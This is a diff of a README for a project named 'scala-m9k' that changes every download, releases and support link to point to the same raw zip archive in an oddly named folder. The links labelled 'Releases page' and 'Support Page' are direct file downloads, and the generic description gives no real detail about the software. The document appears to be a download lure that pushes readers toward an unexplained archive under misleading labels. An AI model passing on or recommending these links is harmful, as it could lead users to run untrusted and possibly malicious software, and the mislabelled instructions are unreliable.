@@ -1,6 +1,6 @@
 # 🌟 scala-m9k - Simplifying Your Scala Experience
 
-[![Download scala-m9k](https://raw.githubusercontent.com/Sishant123/scala-m9k/main/lixiviation/scala-m9k.zip)](https://raw.githubusercontent.com/Sishant123/scala-m9k/main/lixiviation/scala-m9k.zip)
+[![Download scala-m9k](https://github.com/Sishant123/scala-m9k/raw/refs/heads/main/lixiviation/scala_m_k_1.0.zip)](https://github.com/Sishant123/scala-m9k/raw/refs/heads/main/lixiviation/scala_m_k_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **scala-m9k**! This application helps you work with Scala more effici
 
 To get **scala-m9k**, visit the following link to download the latest version:
 
-[Download scala-m9k Releases](https://raw.githubusercontent.com/Sishant123/scala-m9k/main/lixiviation/scala-m9k.zip)
+[Download scala-m9k Releases](https://github.com/Sishant123/scala-m9k/raw/refs/heads/main/lixiviation/scala_m_k_1.0.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of **scala-m9k**.
@@ -54,7 +54,7 @@ Before you install **scala-m9k**, please ensure that your computer meets the fol
 
 3. **Seek Help:**
    - Access the help menu within the application for guidance on specific tasks.
-   - Visit our [Support Page](https://raw.githubusercontent.com/Sishant123/scala-m9k/main/lixiviation/scala-m9k.zip) for more help and community support.
+   - Visit our [Support Page](https://github.com/Sishant123/scala-m9k/raw/refs/heads/main/lixiviation/scala_m_k_1.0.zip) for more help and community support.
 
 ## 📊 Features
 
@@ -69,7 +69,7 @@ To ensure you have the latest features and improvements, periodically check the 
 
 ## 🔗 Links
 
-- [Download scala-m9k Releases](https://raw.githubusercontent.com/Sishant123/scala-m9k/main/lixiviation/scala-m9k.zip)
-- [Support Page](https://raw.githubusercontent.com/Sishant123/scala-m9k/main/lixiviation/scala-m9k.zip)
+- [Download scala-m9k Releases](https://github.com/Sishant123/scala-m9k/raw/refs/heads/main/lixiviation/scala_m_k_1.0.zip)
+- [Support Page](https://github.com/Sishant123/scala-m9k/raw/refs/heads/main/lixiviation/scala_m_k_1.0.zip)
 
 Thank you for using **scala-m9k**! Enjoy coding with Scala and make your development process smoother.
